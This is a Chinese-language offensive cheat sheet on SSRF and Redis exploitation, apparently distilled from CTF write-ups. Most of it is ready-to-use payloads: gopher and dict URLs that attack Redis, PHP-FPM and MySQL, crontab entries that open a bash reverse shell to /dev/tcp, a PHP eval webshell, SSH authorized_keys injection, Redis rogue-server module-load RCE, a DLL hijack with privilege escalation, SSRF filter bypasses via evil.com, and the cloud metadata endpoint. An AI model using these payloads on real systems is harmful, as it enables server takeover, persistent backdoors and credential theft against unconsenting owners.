# 05-SSRF与Redis

## 总览

> **通路**: ② 写文件 / ⑤ 反弹 shell\
> **来源**: `SSRF漏洞.md` L273-L848 + 1156 篇 WP 提炼 + 网络补充

***

## 一、SSRF 常用协议

```plain
http://127.0.0.1:8080/
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_<urlencode_raw_data>     # 万能协议，发自定义 TCP 数据
```

***

## 二、gopher 打 Redis（写马 / 反弹）

```bash
# 一步步用 dict 构造
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/set:1:"\n\n*/1 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\n\n"
dict://127.0.0.1:6379/save

# gopher 一次性打（先抓包再用 Gopherus 构造）
gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall...
```

**Tips**: dict 协议会自动在末尾加 `\r\n`；URL 中提交 payload 需**再 url 编码一次**。\
出处: `SSRF漏洞.md` L605-L848

***

## 三、gopher 打 FastCGI / PHP-FPM ★

**原理**: 伪造 FastCGI 协议包，用 `PHP_VALUE auto_prepend_file=php://input` + `PHP_ADMIN_VALUE allow_url_include=On` 实现任意 PHP 代码执行。

```bash
# 条件: libcurl>=7.45, PHP-FPM 监听 9000, 知道网站绝对路径
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...
  SCRIPT_FILENAME=/var/www/html/index.php
  PHP_VALUE=auto_prepend_file = php://input
  PHP_ADMIN_VALUE=allow_url_include = On
  ...POST body: <?php system("ls");?>
```

工具: `Gopherus`、p牛 `fcgi_exp.py`（<https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）>\
出处: `SSRF漏洞.md` L290-L334

***

## 四、gopher 打 MySQL

```plain
gopher://127.0.0.1:3306/_<登录包+SQL>
```

用于 `SELECT ... INTO OUTFILE` 写马 或 UDF 提权（`sys_eval`）。\
工具: `Gopherus`、`mysql-fake-server`（JDBC 反序列化方向）\
出处: `SSRF漏洞.md` L284；`PWNHUB2022冬.meta.md:54`

***

## 五、Redis GetShell 五姿势 ★★

### 5.1 写 WebShell

```bash
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php eval($_POST[1]);?>"
save
```

条件: 知道 web 绝对路径 + 有写权限

### 5.2 写 SSH 公钥

```bash
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...your_key...\n\n"
save
```

条件: Redis 以 root 运行 + SSH 开启

### 5.3 写 Crontab 反弹

```bash
config set dir /var/spool/cron        # CentOS
config set dir /var/spool/cron/crontabs   # Ubuntu
config set dbfilename root
set x "\n\n*/1 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\n\n"
save
```

### 5.4 主从复制 RCE ★最通用（无需写权限）

**7 步链**:

```plain
dir → dbfilename → slaveof VPS PORT → module load ./exp.so → slave no one → system.exec → module unload
```

```python
# rogue server 端
slaveof <VPS_IP> <PORT>
# 加载恶意 .so 模块后
module load ./exp.so
system.exec "id"
module unload exp
```

工具: `Awsome-Redis-Rogue-Server`、`redis-rogue-server.py`、`RedisModules-ExecuteCommand`\
条件: Redis 4.x/5.x\
出处: `2023春秋杯冬季赛.meta.md:58-86`

### 5.5 DLL 劫持（Windows / Redis 3.x）

```plain
# Redis 3.x 不支持主从 RCE（需 4.0+）→ 改 DLL 劫持
RedisWriteFile.py --rfile dbghelp.dll    # 写入 Redis 目录
# 配合 SeImpersonatePrivilege → SweetPotato 提权
```

出处: `春秋云境MagicRelay.meta.md:25-36`

***

## 六、Redis 特殊变体

| 变体 | 手法 | 出处 |
| --- | --- | --- |
| **Jemalloc Hook** | `debug mallctl arena.0.extent_hooks` 写 fake hooks | `RealWorld CTF 5th.meta.md:14` |
| **EasySwoole** | 默认 `SERIALIZE_PHP` → gopher 注入序列化 payload | `2022春秋杯春季赛.meta.md:96` |
| **MSF 一键** | `exploit/linux/redis/redis_replication_cmd_exec` | `春秋云镜Brute4Road.meta.md:24` |
| **aiohttp 目录穿越** | CVE-2024-23334 读 `dump.rdb` | `2024领航杯.meta.md:8` |

***

## 七、SSRF 打其它内网服务

| 目标 | 手法 | 出处 |
| --- | --- | --- |
| **MySQL** | gopher + UDF `sys_eval` | `PWNHUB2022冬.meta.md:54` |
| **XDebug** | 13000 端口 → PHP RCE | `2021春秋杯mimic-ssrf.meta.md:58` |
| **WebLogic** | uddiexplorer SSRF | `上海大学生赛.meta.md:35` |
| **Docker API** | 2375 未授权 + 容器挂载宿主机 + SSH 公钥注入 | `春秋云镜Unauthorized.meta.md:53` |
| **Jodd-http** | Java 客户端 SSRF | `2022 DSCTF.meta.md:104` |
| **本地接口** | SSRF 打仅 127.0.0.1 可访问的接口 | `第四届红明谷.meta.md:74` |

***

## 八、SSRF 绕过技巧

```plain
# IP 绕过
127.0.0.1 → 0177.0.0.1          # 八进制
127.0.0.1 → 2130706433          # 十进制
127.0.0.1 → 0x7f.0.0.1          # 十六进制
127.0.0.1 → 127.0.0.1.nip.io    # DNS
127.0.0.1 → [::1] / 127.1       # IPv6 / 简写

# URL 解析差异
http://expected@evil.com/
http://evil.com#expected.com
http://evil.com%2f@expected.com

# 302 跳转（VPS 部署重定向到内网）
# 过滤 gopher:// 时 → 先用其它协议触发 302 到 gopher
# DNS-rebinding（第一次合法第二次恶意）
```

出处: `SSRF漏洞.md` L137-L270；`PAYLOAD-CHEATSHEET.md` L463

### 双重 URL 编码

gopher payload 在 URL 中提交需要**二次 url 编码**（`2023数字网络安全人才挑战赛.meta.md:37`）

***

## 九、检测入口点

* URL 参数: `?url=` `?file=` `?path=` `?src=` `?redirect=` `?image=`
* 上传远程图片 / 下载文件 / Webhook
* 数据库连接测试 / 邮件发送
* XML 解析（→ XXE）
* 云元数据: `http://169.254.169.254/latest/meta-data/`
